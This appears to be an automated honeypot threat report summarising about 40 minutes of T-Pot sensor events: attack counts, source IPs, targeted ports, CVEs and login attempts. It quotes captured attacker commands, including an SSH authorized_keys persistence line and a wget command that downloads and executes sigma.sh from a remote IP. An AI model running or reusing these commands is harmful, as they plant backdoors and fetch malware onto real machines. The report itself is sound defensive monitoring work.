Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-22T19:01:34Z
**Timeframe:** 2025-10-22T18:20:01Z to 2025-10-22T19:00:01Z
**Log Files:**
- agg_log_20251022T182001Z.json
- agg_log_20251022T184002Z.json
- agg_log_20251022T190001Z.json

### Executive Summary

This report summarizes 18,678 events collected from the T-Pot honeypot network over a period of approximately 40 minutes. The majority of attacks were captured by the Honeytrap, Dionaea, and Cowrie honeypots. A significant number of attacks targeted SMB (port 445) and Asterisk (port 5038). Attackers were observed attempting to gain access via SSH, with numerous login attempts and commands executed. Multiple CVEs were targeted, with CVE-2022-27255 being the most prominent.

### Detailed Analysis

**Attacks by Honeypot:**
*   Honeytrap: 5,758
*   Dionaea: 5,233
*   Cowrie: 2,529
*   Ciscoasa: 1,752
*   Suricata: 1,684
*   Sentrypeer: 1,449
*   Tanner: 67
*   Mailoney: 65
*   Adbhoney: 42
*   Redishoneypot: 27
*   ElasticPot: 23
*   H0neytr4p: 14
*   Honeyaml: 11
*   Ipphoney: 10
*   ConPot: 5
*   Miniprint: 3
*   Dicompot: 3
*   Heralding: 3

**Top Attacking IPs:**
*   91.124.88.15
*   122.100.114.240
*   182.8.161.75
*   198.23.190.58
*   167.99.222.32
*   1.52.49.139
*   177.46.198.90
*   103.181.143.69
*   107.170.36.5
*   49.247.175.53

**Top Targeted Ports/Protocols:**
*   445 (SMB)
*   5038 (Asterisk)
*   5060 (SIP)
*   UDP/5060 (SIP)
*   22 (SSH)
*   135 (RPC)
*   8333 (Bitcoin)

**Most Common CVEs:**
*   CVE-2022-27255
*   CVE-2019-11500
*   CVE-2021-3449
*   CVE-2002-0013
*   CVE-2002-0012
*   CVE-2021-44228
*   CVE-2002-1149
*   CVE-2006-2369
*   CVE-1999-0517
*   CVE-1999-0183
*   CVE-2021-35394

**Commands Attempted by Attackers:**
*   uname -a
*   cd ~; chattr -ia .ssh; lockr -ia .ssh
*   cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr" >> .ssh/authorized_keys ...
*   cat /proc/cpuinfo | grep name | wc -l
*   pm path com.ufo.miner
*   am start -n com.ufo.miner/com.example.test.MainActivity
*   ps | grep trinity
*   rm -rf /data/local/tmp/*
*   crontab -l
*   whoami
*   top
*   lscpu | grep Model
*   df -h | head -n 2 | awk 'FNR == 2 {print $2;}'

**Signatures Triggered:**
*   ET SCAN Sipsak SIP scan
*   ET DROP Dshield Block Listed Source group 1
*   ET SCAN NMAP -sS window 1024
*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   ET INFO Reserved Internal IP Traffic
*   ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255)
*   ET CINS Active Threat Intelligence Poor Reputation IP group 99

**Users / Login Attempts:**
A wide variety of usernames and passwords were attempted, including common defaults and brute-force attempts.
*   root/C-a-r-l-y9921
*   root/root123
*   ubuntu/ubuntu
*   mitch/mitch
*   345gs5662d34/345gs5662d34
*   anonymous/anonymous@
*   test/truc
*   centos/centos

**Files Uploaded/Downloaded:**
*   sigma.sh
*   bot.mpsl

**HTTP User-Agents:**
*   None observed.

**SSH Clients and Servers:**
*   None observed.

**Top Attacker AS Organizations:**
*   None observed.

### Key Observations and Anomalies

- **SSH Key Persistence:** A recurring pattern observed was the attempt to add a malicious SSH public key to the `authorized_keys` file. This is a common technique to maintain persistent access to a compromised system.
- **Cryptominer Activity:** The commands `pm path com.ufo.miner` and `am start -n com.ufo.miner/com.example.test.MainActivity` suggest attempts to install or interact with an Android-based cryptomining application.
- **Malware Download:** The command `cd /tmp && wget -q http://94.156.152.237:6677/sigma.sh -O master.sh && chmod +x master.sh && ./master.sh` indicates an attempt to download and execute a malicious script.
- **Targeting of VoIP:** The high number of scans on port 5060 (SIP) and 5038 (Asterisk) indicates a continued interest in exploiting VoIP systems, likely for toll fraud or to establish a foothold in a network.
- **Exploitation of Realtek SDK:** The repeated triggering of the signature for CVE-2022-27255 suggests that attackers are actively scanning for and attempting to exploit vulnerabilities in devices using the Realtek eCos RSDK/MSDK.
